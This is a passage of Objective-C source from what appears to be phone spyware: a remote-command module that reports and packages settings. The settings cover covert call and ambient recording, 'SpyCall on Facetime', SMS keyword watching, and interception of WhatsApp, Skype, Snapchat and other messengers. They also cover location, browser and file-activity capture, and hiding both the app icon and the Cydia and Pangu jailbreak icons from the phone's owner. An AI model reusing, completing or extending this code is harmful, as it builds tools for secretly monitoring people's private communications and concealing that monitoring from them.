    if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
        DLog(@"17 request setting: Waiting for approval policy")
        if (prefRestriction) {
            DLog(@"prefRestriction exists")
            if ([prefRestriction mWaitingForApprovalPolicy] == TRUE) {	// means 0 in terms of server
                DLog(@"true")
                wfaPolicy = [wfaPolicy stringByAppendingString:NSLocalizedString(@"kAllow", @"")];
            } else {
                DLog(@"false")
                wfaPolicy = [wfaPolicy stringByAppendingString:NSLocalizedString(@"kDisallow", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", wfaPolicy];
    }
    
    // Calendar
    // Move to group with events
    //	if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
    //		if ([prefEvents mEnableCalendar]) {
    //			calendar = [calendar stringByAppendingString:NSLocalizedString(@"kOn", @"")];
    //		} else {
    //			calendar = [calendar stringByAppendingString:NSLocalizedString(@"kOff", @"")];
    //		}
    //		[resultString appendFormat:@"%@\n", calendar];
    //	}
    
    // Note
    // Move to group with events
    //	if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
    //		if ([prefEvents mEnableNote]) {
    //			note = [note stringByAppendingString:NSLocalizedString(@"kOn", @"")];
    //		} else {
    //			note = [note stringByAppendingString:NSLocalizedString(@"kOff", @"")];
    //		}
    //		[resultString appendFormat:@"%@\n", note];
    //	}
    
    // Keywords
    if ([configurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
        DLog(@"-20- request setting: keywords")
        keywords = [self displayStringWithItems:[prefKeywords mKeywords] andCaption:keywords];
        [resultString appendFormat:@"%@\n", keywords];
    }
    // Call recording
    if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {
        DLog(@"-21- request setting: Call recording")
        // Call recording
        if ([prefEvents mEnableCallRecording])
            callRecording = [callRecording stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        else
            callRecording = [callRecording stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        [resultString appendFormat:@"%@\n", callRecording];
        
        // Flag
        if ([prefCallRecord mWatchFlag] & kWatch_In_Addressbook)
            callRecordWatchOptions=[NSString stringWithFormat:@"%@[%@,",callRecordWatchOptions,@"1"];
        else
            callRecordWatchOptions=[NSString stringWithFormat:@"%@[%@,",callRecordWatchOptions,@"0"];
        
        if ([prefCallRecord mWatchFlag] & kWatch_Not_In_Addressbook)
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@,",callRecordWatchOptions,@"1"];
        else
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@,",callRecordWatchOptions,@"0"];
        
        if ([prefCallRecord mWatchFlag] & kWatch_In_List)
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@,",callRecordWatchOptions,@"1"];
        else
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@,",callRecordWatchOptions,@"0"];
        
        if ([prefCallRecord mWatchFlag] & kWatch_Private_Or_Unknown_Number)
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@]",callRecordWatchOptions,@"1"];
        else
            callRecordWatchOptions=[NSString stringWithFormat:@"%@%@]",callRecordWatchOptions,@"0"];
        
        [resultString appendFormat:@"%@\n", callRecordWatchOptions];
        
        // Numbers
        callRecordWatchNumbers = [self displayStringWithItems:[prefCallRecord mWatchNumbers] andCaption:callRecordWatchNumbers];
        [resultString appendFormat:@"%@\n", callRecordWatchNumbers];
    }
    // SpyCall on Facetime ===========================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_SpyCallOnFacetime]) {
        DLog(@"2 request setting: spycall on facetime")
        if ([prefMonitorFacetimeID mEnableMonitorFacetimeID]) {
            spycallOnFacetime = [spycallOnFacetime stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        }
        else {
            spycallOnFacetime = [spycallOnFacetime stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        }
        spycallOnFacetime = [spycallOnFacetime stringByAppendingString:@", "];
        spycallOnFacetime = [self displayStringWithItems:[prefMonitorFacetimeID mMonitorFacetimeIDs] andCaption:spycallOnFacetime];
        DLog (@">>>> space %@", spycallOnFacetime)
        
        [resultString appendFormat:@"%@\n", spycallOnFacetime];
    }
    // Delivery method ==============================================================================
    if ([prefEvents mDeliveryMethod] == kDeliveryMethodAny) {
        deliveryMethod = [deliveryMethod stringByAppendingString:NSLocalizedString(@"kDeliveryMethodAny", @"")];
    } else if ([prefEvents mDeliveryMethod] == kDeliveryMethodWifi) {
        deliveryMethod = [deliveryMethod stringByAppendingString:NSLocalizedString(@"kDeliveryMethodWifi", @"")];
    }
    [resultString appendFormat:@"%@\n", deliveryMethod];
    
    // URL ==============================================================================
    /*
     if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
     [licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
     
     id <ServerAddressManager> serverAddressManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
     NSString *urlString     = [serverAddressManager getStructuredServerUrl];
     
     if (urlString) {
     NSURL *serverUrl    = [NSURL URLWithString:urlString];
     urlString           = [NSString stringWithFormat:@"%@://%@", [serverUrl scheme], [serverUrl host]];
     DLog(@"##### Server URL %@", urlString )
     
     url = [url stringByAppendingString:urlString];
     [resultString appendFormat:@"%@\n", url];
     }
     }*/
    
    // Visibility of Application icon: ==============================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
        DLog (@"prefVis mVisible = %d, mVisibilities = %@", [prefVisibility mVisible], [prefVisibility mVisibilities]);
        if ([prefVisibility mVisible]) {
            applicationIconVisibility = [applicationIconVisibility stringByAppendingString:NSLocalizedString(@"kShow", @"")];
        } else {
            applicationIconVisibility = [applicationIconVisibility stringByAppendingString:NSLocalizedString(@"kHide", @"")];
        }
        [resultString appendFormat:@"%@\n", applicationIconVisibility];
    }
    
    // Visibility of Cydia, Pangu: ==============================================================================
    NSString *cydiaIconVisibilityValueString = NSLocalizedString(@"kShow", @"");    // Initialize with the default value
    NSString *panguIconVisibilityValueString = NSLocalizedString(@"kShow", @"");    // Initialize with the default value
    
    for (Visible *visible in [prefVisibility mVisibilities]) {
        // -- Cydia
        if ([[visible mBundleIdentifier] isEqualToString:@"com.saurik.Cydia"]) {
            if (![visible mVisible]) {
                cydiaIconVisibilityValueString = NSLocalizedString(@"kHide", @"");
            }
            // -- Pangu
        } else if ([[visible mBundleIdentifier] isEqualToString:@"io.pangu.loader"]) {
            if (![visible mVisible]) {
                panguIconVisibilityValueString = NSLocalizedString(@"kHide", @"");
            }
        }
    }
#if TARGET_OS_IPHONE
    // Cydia
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) { // Use feature of hide application icon
        cydiaIconVisibility = [cydiaIconVisibility stringByAppendingString:cydiaIconVisibilityValueString];
        [resultString appendFormat:@"%@\n", cydiaIconVisibility];
    }
    
    // Pangu
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) { // Use feature of hide application icon
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            pangGuIconVisibility = [pangGuIconVisibility stringByAppendingString:panguIconVisibilityValueString];
            [resultString appendFormat:@"%@\n", pangGuIconVisibility];
        }
    }
#endif
    // Temporal control ambient record
    if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
        if ([prefEvents mEnableTemporalControlAR])
            temporalAmbientRecording = [temporalAmbientRecording stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        else
            temporalAmbientRecording = [temporalAmbientRecording stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        [resultString appendFormat:@"%@\n", temporalAmbientRecording];
    }
    
    // Temporal control screenshot record
    if ([configurationManager isSupportedFeature:kFeatureID_ScreenRecording]) {
        if ([prefEvents mEnableTemporalControlSSR])
            temporalScreenRecording = [temporalScreenRecording stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        else
            temporalScreenRecording = [temporalScreenRecording stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        [resultString appendFormat:@"%@\n", temporalScreenRecording];
    }
    
    // Temporal control NetworkTraffic
    if ([configurationManager isSupportedFeature:kFeatureID_EventNetworkTraffic]) {
        if ([prefEvents mEnableTemporalControlNetworkTraffic])
            temporalNetworkTraffic = [temporalNetworkTraffic stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        else
            temporalNetworkTraffic = [temporalNetworkTraffic stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        [resultString appendFormat:@"%@\n", temporalNetworkTraffic];
    }
    
    // IM attachment limit size
    if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
        NSInteger imageLimitSize    = 0;
        NSInteger audioLimitSize    = 0;
        NSInteger videoLimitSize    = 0;
        NSInteger nonMediaLimitSize = 0;
        
        imageLimitSize              = [prefEvents mIMAttachmentImageLimitSize];
        audioLimitSize              = [prefEvents mIMAttachmentAudioLimitSize];
        videoLimitSize              = [prefEvents mIMAttachmentVideoLimitSize];
        nonMediaLimitSize           = [prefEvents mIMAttachmentNonMediaLimitSize];
        
        NSString *imAttachmentLimitSizeValue    = NSLocalizedString(@"kIMAttachmentLimitSizeValues", @"");
        imAttachmentLimitSizeValue       = [NSString stringWithFormat:imAttachmentLimitSizeValue,
                                            imageLimitSize, audioLimitSize, videoLimitSize, nonMediaLimitSize];
        
        imAttachmentLimitSize       = [imAttachmentLimitSize stringByAppendingString:imAttachmentLimitSizeValue];
        
        [resultString appendFormat:@"%@\n", imAttachmentLimitSize];
    }
    
    // Debug log, Firefox extension
    if ([configurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail]) { // kFeatureID_EVentMacOSEmail indicator for KnowIT Mac
        //
        if ([prefSignup mEnableDebugLog]) {
            debugLog = [debugLog stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        } else {
            debugLog = [debugLog stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        }
        [resultString appendFormat:@"%@\n", debugLog];
        
        //
        firefoxExtension = [firefoxExtension stringByAppendingString:NSLocalizedString(@"kInstalled", @"")];
        [resultString appendFormat:@"%@\n", firefoxExtension];
    }
    
    // File activity reply message to core server
    if ([configurationManager isSupportedFeature:kFeatureID_EventFileActivity]) {
        // File activity
        NSMutableArray *values = [NSMutableArray array];
        
        NSUInteger fileActivityType = [prefFileActivity mActivityType];
        if (fileActivityType & kFileActivityCreate) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeCreate", @"")];
        }
        if (fileActivityType & kFileActivityCopy) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeCopy", @"")];
        }
        if (fileActivityType & kFileActivityMove) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeMove", @"")];
        }
        if (fileActivityType & kFileActivityDelete) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeDelete", @"")];
        }
        if (fileActivityType & kFileActivityModify) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeModifyContent", @"")];
        }
        if (fileActivityType & kFileActivityRename) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeRename", @"")];
        }
        if (fileActivityType & kFileActivityPermissionChange) {
            [values addObject:NSLocalizedString(@"kFileActivityTypePermission", @"")];
        }
        if (fileActivityType & kFileActivityAttributeChange) {
            [values addObject:NSLocalizedString(@"kFileActivityTypeAttribute", @"")];
        }
        
        NSString *fileActivity = nil;
        if ([values count]) {
            fileActivity = [values componentsJoinedByString:@" | "];
        } else {
            fileActivity = NSLocalizedString(@"kNone", @"");
        }
        monitoredFileActivityType = [monitoredFileActivityType stringByAppendingString:fileActivity];
        [resultString appendFormat:@"%@\n", monitoredFileActivityType];
        
        // Excluded paths
        NSString *excludedPaths = nil;
        if ([[prefFileActivity mExcludedFileActivityPaths] count]) {
            excludedPaths = [[prefFileActivity mExcludedFileActivityPaths] componentsJoinedByString:@";"];
        } else {
            excludedPaths = NSLocalizedString(@"kNone", @"");
        }
        excludedFileActivityPaths = [excludedFileActivityPaths stringByAppendingString:excludedPaths];
        [resultString appendFormat:@"%@\n", excludedFileActivityPaths];
    }
    
    //NSString *result=[NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@",capture,delieryRules,events,spycall,locationInterval,watchOptions,home,emergency,watchnumbers];
    NSString *result = [NSString stringWithString:resultString];
    DLog(@"### GetRequestSettings ===> %@",result);
    return result;

}

- (void) processRequestSettings {
    [self sendReplySMSWithResult:[[self class] getRequestSettings]];
}

- (void) createAndSendSettingEvent {	
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
	PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
	PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
	PrefNotificationNumber *prefNotificationNumberList	= (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	PrefEmergencyNumber* prefEmergencyNumberList		= (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
	PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
	PrefKeyword *prefKeywords			= (PrefKeyword *)[prefManager preference:kKeyword];
	PrefMonitorFacetimeID *prefMonitorFacetimeID	= (PrefMonitorFacetimeID *)[prefManager preference:kFacetimeID];
    PrefVisibility *prefVisibility		= (PrefVisibility *) [prefManager preference:kVisibility];
    PrefSignUp *prefSignup = (PrefSignUp *)[prefManager preference:kSignUp];
    PrefFileActivity *prefFileActivity  = (PrefFileActivity *)[prefManager preference:kFileActivity];
    PrefCallRecord *prefCallRecord      = (PrefCallRecord *)[prefManager preference:kCallRecord];

	id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	
	NSMutableArray *settingElementArray = [NSMutableArray array];
	FxSettingsElement *element = nil;
	
	// -- add setting values to array
	
	// -- SMS	
	if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		DLog (@"-1-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSMS];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableSMS]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}	
	// -- CALL
	if ([configurationManager isSupportedFeature:kFeatureID_EventCall]) {
		DLog (@"-2-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCallLog];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCallLog]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- EMAIL
	if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		DLog (@"-3-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdEmail];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableEmail]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- CELL INFO kRemoteCmdCellInfo
	// -- MMS
	if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		DLog (@"-4-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdMMS];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableMMS]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Location
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		DLog (@"-5-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdLocation];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefLocation mEnableLocation]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- IM
	if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
		DLog (@"-6-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIM];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableIM]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        // Individual IM Clients
        /*
         kRemoteCmdIMWhatsApp					= 200,
         kRemoteCmdIMLINE                        = 201,
         kRemoteCmdIMFacebook					= 202,
         kRemoteCmdIMSkype                       = 203,
         kRemoteCmdIMBBM                         = 204,
         kRemoteCmdIMIMessage                    = 205,
         kRemoteCmdIMViber                       = 206,
         kRemoteCmdIMGoogleTalk                  = 207,
         kRemoteCmdIMWeChat                      = 208,
         kRemoteCmdIMYahooMessenger              = 209,
         kRemoteCmdIMSnapchat                    = 210,
         kRemoteCmdIMHangout                     = 211,
         kRemoteCmdIMSlingshot                   = 212,

         */
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWhatsApp]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMWhatsApp];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualWhatsApp) == kPrefIMIndividualWhatsApp]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMLINE]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMLINE];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualLINE) == kPrefIMIndividualLINE]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMFacebook]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMFacebook];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualFacebook) == kPrefIMIndividualFacebook]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSkype]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMSkype];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualSkype) == kPrefIMIndividualSkype]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMBBM]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMBBM];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualBBM) == kPrefIMIndividualBBM]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMIMessage]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMIMessage];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualIMessage) == kPrefIMIndividualIMessage]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMViber]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMViber];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualViber) == kPrefIMIndividualViber]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWeChat]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMWeChat];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualWeChat) == kPrefIMIndividualWeChat]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMYahooMessenger]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMYahooMessenger];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualYahooMessenger) == kPrefIMIndividualYahooMessenger]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSnapchat]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMSnapchat];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualSnapchat) == kPrefIMIndividualSnapchat]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMHangout]) {
            element = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdIMHangout];
            [element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualHangout) == kPrefIMIndividualHangout]];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
        }
        /*
        element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdIMSlingshot];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", ([prefEvents mEnableIndividualIM] & kPrefIMIndividualSlingshot) == kPrefIMIndividualSlingshot]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        */
	}
	// -- Wallpaper
	if ([configurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
		DLog (@"-7-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdWallPaper];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableWallPaper]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Camera
	if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
		DLog (@"-8-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdCameraImage];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCameraImage]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Audio Recording file
	if ([configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
		DLog (@"-9-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAudioRecording];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableAudioFile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Audio conversation (call recording)
	if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {
		DLog (@"-9.2-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdAudioConversation];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableCallRecording]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
        
        NSString *watchOptions	= @"";
        
        if ([prefCallRecord mWatchFlag] & kWatch_In_Addressbook)						// WF1
            watchOptions = [NSString stringWithFormat:@"%@;",@"1"];
        else
            watchOptions = [NSString stringWithFormat:@"%@;",@"0"];
        if ([prefCallRecord mWatchFlag] & kWatch_Not_In_Addressbook)					// WF2
            watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"1"];
        else
            watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"0"];
        if ([prefCallRecord mWatchFlag] & kWatch_In_List)							// WF3
            watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"1"];
        else
            watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"0"];
        if ([prefCallRecord mWatchFlag] & kWatch_Private_Or_Unknown_Number)			// WF4
            watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"1"];
        else
            watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"0"];
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdCallRecordingWatchFlags];
        [element setMSettingValue:watchOptions];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        
        DLog (@"Call record watchOptions = %@", watchOptions);

        NSString *watchNumberString = [self displayStringWithNumberArray:[prefCallRecord mWatchNumbers]
                                                           remoteCommand:kRemoteCmdCallRecordingWatchNumbers];
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdCallRecordingWatchNumbers];
        [element setMSettingValue:watchNumberString];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
	}
	// -- Video file
	if ([configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
		DLog (@"-10-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdVideoFile];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableVideoFile]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Pin message
	if ([configurationManager isSupportedFeature:kFeatureID_EventPinMessage]) {
		DLog (@"-11-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdPinMessage];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnablePinMessage]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Application kRemoteCmdApplication
	// -- Browser url
	if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		DLog (@"-12-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdBrowserURL];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableBrowserUrl]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Application Life Cycle
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
		DLog (@"-13-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdApplicationLifeCycle];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mEnableALC]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
    
    LicenseManager *licenseManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager];
	LicenseInfo *licenseInfo	   = [licenseManager mCurrentLicenseInfo];
	if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
		[licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
        // -- Start/Stop capture
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdSetStartStopCapture];
        [element setMSettingValue:[NSString stringWithFormat:@"%d", [prefEvents mStartCapture]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        // -- Delivery Timer
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdSetDeliveryTimer];
        [element setMSettingValue:[NSString stringWithFormat:@"%ld", (long)[prefEvents mDeliverTimer]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        // -- Event Count
        element = [[FxSettingsElement alloc] init];
        [element setMSettingId:kRemoteCmdSetEventCount];
        [element setMSettingValue:[NSString stringWithFormat:@"%ld", (long)[prefEvents mMaxEvent]]];
        [settingElementArray addObject:element];
        [element release];
        element = nil;
        /*
        //-- URL
        id <ServerAddressManager> serverAddressManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
        NSString *urlString = [serverAddressManager getStructuredServerUrl] ? [serverAddressManager getStructuredServerUrl] : @"";
        if (urlString) {
            NSURL *url  = [NSURL URLWithString:urlString];
            urlString   = [NSString stringWithFormat:@"%@://%@", [url scheme], [url host]];

            element     = [[FxSettingsElement alloc] init];
            [element setMSettingId:kRemoteCmdURL];
            [element setMSettingValue:urlString];
            [settingElementArray addObject:element];
            [element release];
            element = nil;
            
            DLog(@"##### Server URL %@", urlString)
        }
         */
	}
    
    // -- Enable watch
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog (@"-14-")
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetEnableWatch];
		[element setMSettingValue:[NSString stringWithFormat:@"%d", [prefWatchList mEnableWatchNotification]]];
		[settingElementArray addObject:element];
		[element release];
		element = nil;
	}
	// -- Watch flag and Watch number
	if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
		DLog (@"-15.1-")
		NSString *watchOptions	= [NSString string];
		
		if ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)						// WF1
			watchOptions = [NSString stringWithFormat:@"%@;",@"1"];		
		else
			watchOptions = [NSString stringWithFormat:@"%@;",@"0"];
		if ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)					// WF2
			watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@;", watchOptions,@"0"];
		if ([prefWatchList mWatchFlag] & kWatch_In_List)							// WF3
			watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@;",watchOptions,@"0"];	
		if ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)			// WF4
			watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"1"];
		else 
			watchOptions = [NSString stringWithFormat:@"%@%@",watchOptions,@"0"];
		element = [[FxSettingsElement alloc] init];
		[element setMSettingId:kRemoteCmdSetWatchFlags];
